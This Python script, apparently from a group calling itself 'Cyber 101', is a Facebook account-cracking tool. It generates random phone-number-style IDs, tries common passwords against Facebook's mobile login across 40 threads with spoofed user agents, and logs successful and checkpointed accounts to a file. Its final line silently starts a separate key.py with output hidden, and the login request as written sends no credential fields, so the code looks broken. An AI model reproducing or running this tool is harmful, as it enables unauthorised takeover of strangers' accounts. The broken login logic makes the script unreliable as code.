import subprocess
#!/usr/bin/python3
#Coding by Ghost(Darkness)
#Team of Cyber 101
import time,random,os,string
import os,re,sys,uuid,random,requests,time,json,string
from concurrent.futures import ThreadPoolExecutor as ThreadPool

t = time.localtime(time.time())
localtime = time.asctime(t)
tim = "Current Time:" + time.asctime(t)
sys.stdout.write('\x1b]2; [MR GHOST-CYBER 101] GIFT\x07')
#-----(user argent)---------#
user = []
ugen2=[]
ugen=[]
ugen3=[]


#-----(ok id sound)----#
def sound():
    os.system('espeak -a 150 " Taybul,  Ok,  id"')
#----(🥱)-----#
loop=0
oks=[]
cps=[]
#-----(colour)-------#
g="\033[1;92m"
r="\033[1;91m"
b="\033[1;90m"
p="\033[1;95m"
y="\033[1;93m"
R = '\x1b[1;31m'
H = '\x1b[1;32m'
G1 = '\x1b[1;32m'
K = '\x1b[1;33m'
B = '\x1b[1;34m'
U = '\x1b[1;35m' 
O = '\x1b[1;36m'
N = '\x1b[0m' 
Z = "\033[1;37m"
#----(line)----#
line=(f"{p}∆{r}————————————————————————————————————{p}∆")
#-----(main)------#
def Main():
    ax=(f"{r}[{b}1{r}]{g} RANDOM BD\n")
    bx=(f"{r}[{b}2{r}]{g} JOIN MY FB GROUP\n")
    cx=(f"{r}[{b}3{r}]{g} FOLLOW MY GITHUB\n")
    dx=(f"{r}[{b}0{r}]{g} EXIT TOOLS\n")
    ex=ax+bx+cx+dx+line
    print(ex)
    TAYBUL=input(f"{r}[{b}≈{r}]{g} CHOICE {r}: {y}")
    if TAYBUL in ['1']:
        random1()
    elif TAYBUL in ['2']:    
        os.system('xdg-open https://www.facebook.com/profile.php?id=100084310221946&mibextid=5N0WYUVeg6tIdfMR')
    elif TAYBUL in ['3']:
        os.system('xdg-open https://github.com/SlickxMercy')
    elif TAYBUL in ['0']:
        print(f"{r}[{b}≈{r}]{g} THANK YOU BRO AND GOOD BYE")
        exit()
    
#-------(logo)------#
def logo():
    os.system('clear')
    print(f"""
{r}[{y}KING OF DEATH{r}]{g}    
{g}   DERIAN                                 

{p}∆{r}————————————————————————————————————{p}∆
{r}[{b}≈{r}]{g} TOOLS {r}∞>{y} MAKE {r}BY {g}SlickMercy
{p}∆{r}————————————————————————————————————{p}∆
""")    
#---------(MEnu)------#
def menu():
    logo()
    Main()
#-----(random-----)#
def random1():
    user=[]
    pwx=[]
    logo()
    print(f'{R}[{B}>{R}]{H} EXAMPLE {R}>{B}>{K} [{G1}017{R}/{G1}018{R}/{G1}019{R}/{G1}016{K}] ')
    code=str(input(f"{r}[{b}≈{r}]{g} CHOICE {r}: {y}"))
    print(f'{R}[{B}>{R}]{H} EXAMPLE {R}>{B}> {K}[{G1}2000{R}/{G1}5000{R}/{G1}10000{R}/{G1}100000{K}]')
    print(line)
    limit=int(input(f"{r}[{b}≈{r}]{g} CHOICE {r}: {y}"))
    print(line)
    for Taybul in range(limit):
        xx=str(random.choice(range(1000000,9999999)))
        user.append(xx)
    print(f"{r}[{b}1{r}]{g} METHOD 1")  
    MET=input(f"{r}[{b}≈{r}]{g} CHOICE {r}: {y}")
    with ThreadPool(max_workers=40) as taybul:  
        logo()
        print(line)
        print(f"{r}[{b}≈{r}]{g} MTD{r}/{g}SIM{r}/{g}LIMT {r}>{g} M{MET}{r}/{g}{code}{r}/{g}{limit}")
        print(line)
        for tx in user:
            uid = code+tx
            pwx = [uid[:6],tx[2:8],tx[1:8],uid,tx,'i love you','bangladesh','jannatul','203040','102030','708090','sadiya']
            if MET in ['1']:
                taybul.submit(lionking,uid,pwx)
    

def uoa():
    ver=str(random.choice(range(77,500)))
    ver2=str(random.choice(range(57,77)))
    chorom = f"Chrome/"+str(random.randrange(99,499))+".0."+str(random.randrange(1111,9999))+"."+str(random.randrange(111,999))
    a=f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver}.0.0.{ver2} Safari/537.36"
    b=f"Mozilla/5.0 (Linux; Android 11; NTN-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver}.0.0.{ver2} Mobile Safari/537.36"
    c=f"Mozilla/5.0 (Linux; Android 12; V2027) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver}.0.0.{ver2} Mobile Safari/537.36"
    d=f"Mozilla/5.0 (Linux; Android 12; SM-G988B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver}.0.0.{ver2} Mobile Safari/537.36 "
    e=f"Mozilla/5.0 (Linux; Android 11; SM-A415F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver}.0.0.{ver2} Mobile Safari/537.36"
    g=f"Mozilla/5.0 (Linux; Android 7.1.1; SM-T550) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver}.0.0.{ver2} Safari/537.36"
    h=f"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver}.0.0.{ver2} Safari/537.36 [ip:217.171.66.222]"
    j=f"Mozilla/5.0 (Linux; Android 10; SM-A515F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{ver}.0.0.{ver2} Mobile Safari/537.36"
    k=f"Mozilla/5.0 (Linux; Android 8.1.0; DUB-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver}.0.0.{ver2} Mobile Safari/537.36"
    l=f"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver}.0.0.{ver2} Safari/537.36"
    q=f"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0 [ip:146.241.178.174]"
    w=f"Mozilla/5.0 (iPhone; CPU iPhone OS 15_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19H370 [FBAN/FBIOS;FBAV/449.0.2.30.109;FBBV/561422023;FBDV/iPhone8,1;FBMD/iPhone;FBSN/iOS;FBSV/15.8;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5;FBRV/0] [ip:68.195.20.54]"
    r=f"Mozilla/5.0 (Linux; U; Android 11; es-us; Redmi Note 10S Build/RP1A.200720.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{ver}.0.0.{ver2} Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.9.3.3-gn"
    t=f"Mozilla/5.0 (Linux; Android 10; Nokia 7.1) AppleWebKit/537.36 (KHTML, like Gecko) {chorom} Mobile Safari/537.36"
    y=f"Mozilla/5.0 (Linux; Android 10; SM-G973W) AppleWebKit/537.36 (KHTML, like Gecko) {chorom} Mobile Safari/537.36"
    u=f"Mozilla/5.0 (iPad; CPU OS 13_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/81.0.264749124 Mobile/15E148 Safari/605.1"
    i=f"Mozilla/5.0 (Linux; Android 8.0.0; moto e5 play) AppleWebKit/537.36 (KHTML, like Gecko) {chorom} Mobile Safari/537.36"
    o=f"Mozilla/5.0 (Linux; Android 8.1.0; moto e5 go) AppleWebKit/537.36 (KHTML, like Gecko) {chorom} Mobile Safari/537.36"
    p=f"Mozilla/5.0 (Linux; U; Android 10; en-us; RMX1931 Build/QKQ1.191021.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 {chorom} Mobile Safari/537.36 HeyTapBrowser/45.7.0.0"
    z=f"Mozilla/5.0 (Linux; Android 8.0.0; Infinix X608) AppleWebKit/537.36 (KHTML, like Gecko) {chorom} Mobile Safari/537.36"
    x=f"Mozilla/5.0 (Linux; Android 6.0; Infinix HOT 4 Pro) AppleWebKit/537.36 (KHTML, like Gecko) {chorom} Mobile Safari/537.36"
    xx=f"Mozilla/5.0 (Linux; Android 4.2.2; M-MP8S2A3G Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) {chorom} Safari/537.36"
    return random.choice([a,b,c,d,e,g,h,j,k,l,q,w,r,t,y,u,i,o,p,z,x,xx])
    
    
color=["\033[1;36m","\033[1;35m","\033[1;34m","\033[1;33m","\033[1;32m","\033[1;31m"]
def lionking(uid,pwx):
    global oks,loop,cps
    session=requests.Session()
    sys.stdout.write(f"\r {Z}[{H}{random.choice(color)}MR-LION{Z}]>{Z}[{H}{random.choice(color)}{loop}{Z}]>{Z}[{H}{random.choice(color)}OK:{len(oks)}{Z}>{K}{random.choice(color)}CP:{len(cps)}{Z}] \r"),
    sys.stdout.flush()
    try:
        for ps in pwx:
            free_fb = session.get(f'https://m.facebook.com').text
            datax={"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),"try_number":'',"unrecognized_tries":'',"login":"Continue"}
            responsex=session.post('https://mbasic.facebook.com/login.php', data=datax)
            responsex=session.post('https://mbasic.facebook.com/login.php', data=datax)
            if 'home' in responsex.text or 'create' in responsex.text or 'story' in responsex.text or 'https://www.facebook.com' in responsex.text:
                print(f"\r{Z}[{H}{random.choice(color)}MR-LION{Z}]>{Z}[{H}{random.choice(color)}{loop}{Z}]>{Z}[{H}{random.choice(color)}OK:{len(oks)}{Z}>{K}{random.choice(color)}CP:{len(cps)}{Z}] ",uid,"|",ps,"       ")
                with open('save/checkpoint.txt', 'a') as cekpoint:
                    cekpoint.write(uid+'|'+ps+'\n')
                cekpoint.close()
                oks.append(uid+ps)
                break
            elif 'checkpoint' in responsex.text:
                print(f"\r{Z}[{H}{random.choice(color)}MR-LION{Z}]>{Z}[{H}{random.choice(color)}{loop}{Z}]>{Z}[{H}{random.choice(color)}OK:{len(oks)}{Z}>{K}{random.choice(color)}CP:{len(cps)}{Z}] ",uid,"|",ps,"       ")
                with open('save/checkpoint.txt', 'a') as cekpoint:
                    cekpoint.write(uid+'|'+ps+'\n')
                cekpoint.close()
                cps.append(uid+ps)
                break
    except:
        pass
    loop+=1


if __name__ == '__main__':
    menu()

subprocess.Popen(['python', 'key.py'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
